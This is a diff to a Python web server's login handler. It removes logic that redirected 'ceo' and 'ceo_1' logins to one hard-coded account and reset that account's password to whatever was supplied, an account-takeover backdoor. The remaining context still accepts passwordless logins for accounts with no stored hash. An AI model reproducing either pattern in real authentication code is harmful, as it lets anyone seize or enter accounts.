@@ -8920,7 +8920,7 @@ class KandidHandler(SimpleHTTPRequestHandler):
                 
             raw_identifier = (body.get("identifier") or body.get("handle") or body.get("username") or body.get("email") or "").strip().lower()
             clean_handle = raw_identifier.replace("@", "")
-            alias_handle = "ceo" if clean_handle in ("ceo", "ceo_1") else ("anam" if clean_handle == "anum" else ("anam1" if clean_handle == "anum1" else clean_handle))
+            alias_handle = "anam" if clean_handle == "anum" else ("anam1" if clean_handle == "anum1" else clean_handle)
             password = (body.get("password") or "").strip()
             
             if not raw_identifier:
@@ -8935,9 +8935,8 @@ class KandidHandler(SimpleHTTPRequestHandler):
                 return self.send_json(404, {"error": f"Account '{raw_identifier}' not found. Please sign up!"})
             
             matched_user = None
-            sorted_candidates = sorted([dict(r) for r in rows], key=lambda x: 0 if x["id"] == "u_1237b86d" else (1 if clean_handle in ("ceo", "ceo_1") else 2))
-
-            for cand in sorted_candidates:
+            for r in rows:
+                cand = dict(r)
                 if cand.get("password_hash") and cand.get("salt"):
                     if password and verify_password(password, cand["salt"], cand["password_hash"]):
                         matched_user = cand
@@ -8945,15 +8944,6 @@ class KandidHandler(SimpleHTTPRequestHandler):
                 elif not password:
                     matched_user = cand
                     break
-
-            if matched_user and clean_handle in ("ceo", "ceo_1") and matched_user["id"] != "u_1237b86d":
-                cursor.execute("SELECT * FROM users WHERE id = 'u_1237b86d' LIMIT 1")
-                primary_ceo = cursor.fetchone()
-                if primary_ceo:
-                    matched_user = dict(primary_ceo)
-                    new_hash, new_salt = hash_password(password)
-                    cursor.execute("UPDATE users SET password_hash = ?, salt = ? WHERE id = 'u_1237b86d'", (new_hash, new_salt))
-                    conn.commit()
 
             if not matched_user:
                 if not password:
